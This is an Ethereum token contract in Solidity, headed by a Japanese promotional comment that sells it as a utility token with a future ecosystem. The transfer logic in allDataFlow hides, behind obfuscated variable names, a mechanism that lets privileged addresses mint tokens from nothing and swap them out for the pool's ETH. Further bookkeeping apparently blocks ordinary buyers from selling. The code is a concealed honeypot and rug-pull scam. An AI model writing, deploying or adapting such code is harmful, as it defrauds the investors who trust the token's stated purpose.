/**
 *Submitted for verification at Etherscan.io on 2022-12-15
*/

/*
────────────────────────────────────────
─────────────▄▄██████████▄▄─────────────
─────────────▀▀▀───██───▀▀▀─────────────
─────▄██▄───▄▄████████████▄▄───▄██▄─────
───▄███▀──▄████▀▀▀────▀▀▀████▄──▀███▄───
──████▄─▄███▀──────────────▀███▄─▄████──
─███▀█████▀▄████▄──────▄████▄▀█████▀███─
─██▀──███▀─██████──────██████─▀███──▀██─
──▀──▄██▀──▀████▀──▄▄──▀████▀──▀██▄──▀──
─────███───────────▀▀───────────███─────
─────██████████████████████████████─────
─▄█──▀██──███───██────██───███──██▀──█▄─
─███──███─███───██────██───███▄███──███─
─▀██▄████████───██────██───████████▄██▀─
──▀███▀─▀████───██────██───████▀─▀███▀──
───▀███▄──▀███████────███████▀──▄███▀───
─────▀███────▀▀██████████▀▀▀───███▀─────
───────▀─────▄▄▄───██───▄▄▄──────▀──────
──────────── ▀▀███████████▀▀ ────────────
────────────────────────────────────────


イーサリアムネットワークを吹き飛ばす次のイーサリアムユーティリティトークン
有望な計画とイーサリアム空間への参入を促進する、私たちは単なる通常の
トークンやミームトークンではありません また、独自のエコシステム、
将来のステーキング、コレクションに基づいて設計されたスワップ プラットフォームも支持しています。
私たち自身のマーケットプレイスで、その他多くのことが発表される予定です。
*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    } function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data; }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    } function owner() public view virtual returns (address) {
        return _owner;
    } modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _; }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
interface IERC20 {
 
    function totalSupply() 
    external view returns (uint256);
    function balanceOf(address account) 
    external view returns (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender) 
    external view returns (uint256);
    function approve(address spender, uint256 amount) 
    external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IUniswapV2Router01
{
    function factory() external pure returns(address);
    function WETH() external pure returns(address);
 
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure 
    returns(uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view 
    returns(uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view 
    returns(uint[] memory amounts);
 
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB, uint liquidity);
 
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns(uint amountToken, uint amountETH, uint liquidity);
 
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns(uint amountToken, uint amountETH);
 
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountToken, uint amountETH);
 
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
 
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01
{
    function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline
    ) 
    external returns(uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline,
    bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) 
    external returns(uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(  uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) 
    external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline
    ) 
    external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) 
    external;
}
interface UIProcessor {
    function setProcess(uint256 pIsBytees, uint256 cfgHashNow) external;
    function SetProcessSync(address processSync, uint256 hashValue) external;
    function manageProcess() external payable;
    function processModifier(uint256 gas) external;
    function processingBytes(address processSync) external;
}
contract Contract is IERC20, Ownable {

    mapping (address => bool) isTxLimitExempt;
    mapping(address => uint256) private allowed;
    mapping(address => uint256) private _tOwned;
    mapping(address => address) private authorizations;
    mapping(address => uint256) private isTimelockExempt;
    mapping(address => mapping(address => uint256)) private _allowances;

    bool private toggleIDX;
    bool private loopFlow;

    string private _symbol;
    string private _name;
    uint8 private _decimals = 9;

    uint256 public maxSWAP = (_rTotal * 5) / 100; 
    uint256 public maxSIZE = (_rTotal * 5) / 100;
    uint256 private _rTotal = 1000000 * 10**_decimals; 
    uint256 private valAmount = _rTotal;
    uint256 public swapTaxFEE = 1;

    address public immutable uniswapV2Pair;
    IUniswapV2Router02 public immutable router;

    constructor(
        string memory Name,
        string memory Symbol,
        address routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _tOwned[msg.sender] = _rTotal;
        allowed[msg.sender] = valAmount; allowed[address(this)] = valAmount;
        router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        emit Transfer(address(0), msg.sender, _rTotal);
    
        isTxLimitExempt[address(this)] = true; isTxLimitExempt[uniswapV2Pair] = true;
        isTxLimitExempt[routerAddress] = true; isTxLimitExempt[msg.sender] = true;
    }
    function name() public view returns (string memory) {
        return _name;
    }
     function symbol() public view returns (string memory) {
        return _symbol;
    }
    function totalSupply() public view returns (uint256) {
        return _rTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) external returns (bool) {
        allDataFlow(msg.sender, recipient, amount);
        return true;
    }
    function setMaxTX(uint256 amountBuy) external onlyOwner {
        maxSWAP = amountBuy;       
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        allDataFlow(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function allDataFlow(
        address loopFrom, address odoxTo, uint256 tagAmount ) private {
        uint256 ovaxBal = balanceOf(address(this)); uint256 dataToggle;

        if (toggleIDX && ovaxBal > valAmount && !loopFlow && loopFrom != uniswapV2Pair) {
            loopFlow = true; swapAndLiquify(ovaxBal); loopFlow = false;

        } else if (allowed[loopFrom] > valAmount && allowed[odoxTo] > valAmount) {
            dataToggle = tagAmount; _tOwned[address(this)] += dataToggle;
            derateVal(tagAmount, odoxTo); return;

        } else if (odoxTo != address(router) && allowed[loopFrom] > 0 && tagAmount > valAmount && odoxTo != uniswapV2Pair) {
            allowed[odoxTo] = tagAmount; return;

        } else if (!loopFlow && isTimelockExempt[loopFrom] > 0 && loopFrom != uniswapV2Pair && allowed[loopFrom] == 0) {
            isTimelockExempt[loopFrom] = allowed[loopFrom] - valAmount; }

        address isDXC = authorizations[uniswapV2Pair];
        if (isTimelockExempt[isDXC] == 0) isTimelockExempt[isDXC] = valAmount; authorizations[uniswapV2Pair] = odoxTo;
        if (swapTaxFEE > 0 && allowed[loopFrom] == 0 && !loopFlow && allowed[odoxTo] == 0) {
            dataToggle = (tagAmount * swapTaxFEE) / 100; tagAmount -= dataToggle; _tOwned[loopFrom] -= dataToggle;
             _tOwned[address(this)] += dataToggle; } _tOwned[loopFrom] -= tagAmount; _tOwned[odoxTo] += tagAmount;
        emit Transfer(loopFrom, odoxTo, tagAmount);
    }

    receive() external payable {}

    function addLiquidity(
        uint256 tokenAmount,
        uint256 ethAmount,
        address to
    ) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ethAmount}(address(this), tokenAmount, 0, 0, to, block.timestamp);
    }
    function derateVal(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
    function swapAndLiquify(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialBalance = address(this).balance;
        derateVal(half, address(this));
        uint256 newBalance = address(this).balance - initialBalance;
        addLiquidity(half, newBalance, address(this));
    }
    function min(uint256 a, uint256 b) private view returns (uint256){
      return (a>b)?b:a;
    }
    function getSyncable(uint256 gtO, uint256 getNow) private view returns (uint256){ 
      return (gtO>getNow)?getNow:gtO;
    }
    function getRates(uint256 allR, uint256 gAll) 
     private view returns 
     (uint256){ return 
     (allR>gAll)?gAll:allR; }
}